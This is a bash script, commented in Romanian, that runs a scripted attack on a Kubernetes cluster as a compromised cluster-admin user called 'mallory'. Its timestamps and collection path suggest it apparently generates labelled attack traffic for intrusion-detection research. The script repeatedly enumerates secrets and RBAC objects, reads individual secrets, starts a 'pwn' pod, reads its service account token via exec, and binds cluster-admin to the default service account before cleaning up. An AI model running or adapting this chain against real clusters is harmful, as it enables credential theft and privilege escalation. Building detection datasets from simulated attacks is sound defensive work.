#!/bin/bash
# Activitate de ATAC ca 'mallory' (cont compromis cu cluster-admin).
# Lanț realist: recon -> acces credentiale -> mișcare laterală (exec) -> escaladare/persistență.
set -uo pipefail
KC="${KC:-/tmp/ids_collect/kubeconfig-mallory}"
K="kubectl --kubeconfig $KC"
RECON_ROUNDS="${RECON_ROUNDS:-3}"
echo "ATTACK_START=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# 1. RECON (repetat ca să formeze mai multe ferestre)
for r in $(seq 1 "$RECON_ROUNDS"); do
  $K get secrets -A            >/dev/null 2>&1
  $K get serviceaccounts -A    >/dev/null 2>&1
  $K get roles -A              >/dev/null 2>&1
  $K get rolebindings -A       >/dev/null 2>&1
  $K get clusterroles          >/dev/null 2>&1
  $K get clusterrolebindings   >/dev/null 2>&1
  $K get pods -A -o wide       >/dev/null 2>&1
  $K get nodes -o wide         >/dev/null 2>&1
  echo "   recon $r/$RECON_ROUNDS"
done

# 2. ACCES CREDENȚIALE (citește secrete individuale)
for s in $($K get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}' 2>/dev/null | head -15); do
  ns="${s%/*}"; name="${s#*/}"
  $K get secret "$name" -n "$ns" -o yaml >/dev/null 2>&1
done
echo "   secrete citite"

# 3. MIȘCARE LATERALĂ (creează pod + exec în el)
$K run pwn --image=busybox --restart=Never -- sleep 3600 >/dev/null 2>&1
$K wait --for=condition=Ready pod/pwn --timeout=60s >/dev/null 2>&1 || sleep 8
$K exec pwn -- id >/dev/null 2>&1
$K exec pwn -- cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1
echo "   exec în pod"

# 4. ESCALADARE / PERSISTENȚĂ
$K create clusterrolebinding pwn-admin --clusterrole=cluster-admin --serviceaccount=default:default >/dev/null 2>&1
$K auth can-i --list >/dev/null 2>&1
echo "   escaladare (clusterrolebinding)"

echo "ATTACK_END=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# curățenie artefacte atac
$K delete pod pwn --force --grace-period=0 >/dev/null 2>&1 || true
$K delete clusterrolebinding pwn-admin     >/dev/null 2>&1 || true
echo "   (curățat: pod pwn + clusterrolebinding)"
